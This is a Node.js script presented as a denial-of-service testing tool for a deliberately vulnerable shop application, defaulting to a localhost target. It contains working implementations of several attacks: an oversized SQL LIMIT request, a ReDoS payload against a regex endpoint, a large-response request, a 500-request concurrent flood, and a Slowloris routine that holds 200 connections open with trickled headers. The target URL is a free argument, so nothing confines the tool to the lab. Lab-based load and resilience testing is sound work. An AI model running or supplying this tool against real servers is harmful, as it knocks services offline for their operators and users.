/**
 * DoS Testing Tool for Vulnerable Shop
 * Usage: node dos_tool.js [type] [target_url]
 * Types: 
 *   - limit: Test Resource Exhaustion via SQL LIMIT
 *   - redos: Test Regular Expression DoS
 *   - large: Test Large Response Body
 *   - flood: Simple HTTP Flood (Concurrency test)
 *   - slowloris: Test Slowloris attack (Exhaust connection pool)
 */

const http = require('http');
const url = require('url');

const args = process.argv.slice(2);
const type = args[0] || 'help';
const baseUrl = args[1] || 'http://localhost/vulnerable-shop';

if (type === 'help') {
    console.log('Usage: node dos_tool.js [type] [target_url]');
    console.log('Types:');
    console.log('  limit      - Test Resource Exhaustion via SQL LIMIT (products.php)');
    console.log('  redos      - Test Regular Expression DoS (dos_test.php)');
    console.log('  large      - Test Large Response Body (dos_test.php)');
    console.log('  flood      - Intensive HTTP Flood (500 concurrent requests)');
    console.log('  slowloris  - Slowloris attack (Keeps connections open)');
    process.exit(0);
}

async function makeRequest(targetUrl) {
    return new Promise((resolve, reject) => {
        const start = Date.now();
        const req = http.get(targetUrl, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                if (type !== 'large') data += chunk;
            });
            res.on('end', () => {
                const duration = Date.now() - start;
                resolve({ status: res.statusCode, duration, size: data.length });
            });
        });
        req.on('error', (err) => {
            reject(err);
        });
        // Set a timeout for the request
        req.setTimeout(500, () => {
            req.destroy();
            reject(new Error('Request Timeout'));
        });
    });
}

function runSlowloris(targetUrl) {
    const parsedUrl = url.parse(targetUrl);
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || 80,
        path: parsedUrl.path,
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Connection': 'keep-alive'
        }
    };

    const connections = 200;
    console.log(`Starting Slowloris attack on ${targetUrl} with ${connections} connections...`);
    
    for (let i = 0; i < connections; i++) {
        const req = http.request(options, (res) => {
            // We don't expect a response soon
        });

        req.on('error', (e) => {
            // console.error(`Connection ${i} error: ${e.message}`);
        });

        // Send partial headers and keep the connection open
        req.write('X-a: b\r\n');
        
        // Periodically send more headers to keep it alive
        setInterval(() => {
            if (!req.destroyed) {
                req.write(`X-keep-alive-${Math.random()}: ${Math.random()}\r\n`);
                process.stdout.write('s');
            }
        }, 10000);

        process.stdout.write('.');
    }
    console.log('\nConnections established. Server might become unresponsive soon.');
}

async function runTest() {
    console.log(`Starting DoS test: ${type} on ${baseUrl}`);
    
    try {
        switch (type) {
            case 'limit':
                const limitUrl = `${baseUrl}/products.php?limit=1000000`;
                console.log(`Requesting: ${limitUrl}`);
                const limitRes = await makeRequest(limitUrl);
                console.log(`Result: Status ${limitRes.status}, Duration: ${limitRes.duration}ms`);
                break;

            case 'redos':
                const redosUrl = `${baseUrl}/dos_test.php?type=redos&pattern=(a+)+$`;
                console.log(`Requesting: ${redosUrl}`);
                console.log('Warning: This might hang the server process for a while...');
                const redosRes = await makeRequest(redosUrl);
                console.log(`Result: Status ${redosRes.status}, Duration: ${redosRes.duration}ms`);
                break;

            case 'large':
                const largeUrl = `${baseUrl}/dos_test.php?type=large_body`;
                console.log(`Requesting: ${largeUrl}`);
                const largeRes = await makeRequest(largeUrl);
                console.log(`Result: Status ${largeRes.status}, Duration: ${largeRes.duration}ms (Response body ignored to save memory)`);
                break;

            case 'flood':
                const floodUrl = `${baseUrl}/index.php`;
                const concurrency = 500;
                console.log(`Flooding ${floodUrl} with ${concurrency} concurrent requests...`);
                const promises = [];
                for (let i = 0; i < concurrency; i++) {
                    promises.push(makeRequest(floodUrl).then(r => {
                        process.stdout.write('.');
                        return r;
                    }).catch(e => {
                        process.stdout.write('X');
                        return { error: e.message };
                    }));
                }
                const results = await Promise.all(promises);
                console.log('\nFlood completed.');
                const success = results.filter(r => !r.error).length;
                const failed = results.filter(r => r.error).length;
                const avgDuration = results.filter(r => !r.error).reduce((acc, r) => acc + r.duration, 0) / (success || 1);
                console.log(`Success: ${success}, Failed: ${failed}, Avg Duration: ${avgDuration.toFixed(2)}ms`);
                break;

            case 'slowloris':
                runSlowloris(baseUrl);
                break;

            default:
                console.log('Unknown test type.');
        }
    } catch (error) {
        console.error('Error during test:', error.message);
    }
}

runTest();
